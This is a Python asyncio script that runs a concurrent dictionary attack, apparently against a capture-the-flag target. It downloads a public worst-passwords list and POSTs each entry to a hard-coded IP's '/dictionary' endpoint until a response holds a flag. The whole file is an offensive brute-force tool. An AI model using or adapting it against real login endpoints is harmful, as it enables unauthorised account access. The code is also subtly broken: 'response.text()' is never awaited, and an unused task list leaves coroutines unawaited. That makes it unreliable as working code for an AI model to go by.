import asyncio
import aiohttp

# Server information
ip = "94.237.54.42"  # Replace with your server IP address
port = 32157         # Replace with your server port number
url = f"http://{ip}:{port}/dictionary"

async def try_password(session, password):
    """
    Attempt a single password by sending a POST request.
    """
    data = {'password': password}
    try:
        async with session.post(url, data=data) as response:
            if response.status == 200:  # Check for a successful response
                json_data = await response.json()
                if 'flag' in json_data:  # Check if the response contains the flag
                    print(f"✅ Correct password found: {password}")
                    print(f"🏴 Flag: {json_data['flag']}")
                    return True
    except Exception as e:
        print(f"Error with password {password}: {e}")
    return False

async def main():
    """
    Main function to orchestrate the dictionary attack.
    """
    # Fetch password list
    print("🔄 Downloading password list...")
    async with aiohttp.ClientSession() as session:
        passwords = await fetch_password_list(session)
        print(f"✅ Password list downloaded: {len(passwords)} passwords.")

        tasks = [try_password(session, password) for password in passwords]
        
        # Run tasks concurrently with a limit on the number of concurrent requests
        semaphore = asyncio.Semaphore(100)  # Limit concurrency to avoid overwhelming the server
        async def task_wrapper(password):
            async with semaphore:
                return await try_password(session, password)
        
        results = await asyncio.gather(*[task_wrapper(password) for password in passwords])

        # Stop execution early if a password is found
        if any(results):
            print("🎯 Attack completed.")
        else:
            print("💥 Attack failed. No valid password found.")

async def fetch_password_list(session):
    """
    Fetches the password list from the external URL.
    """
    response = await session.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt")
    return response.text().splitlines()

if __name__ == "__main__":
    print("🚀 Starting dictionary attack...")
    asyncio.run(main())
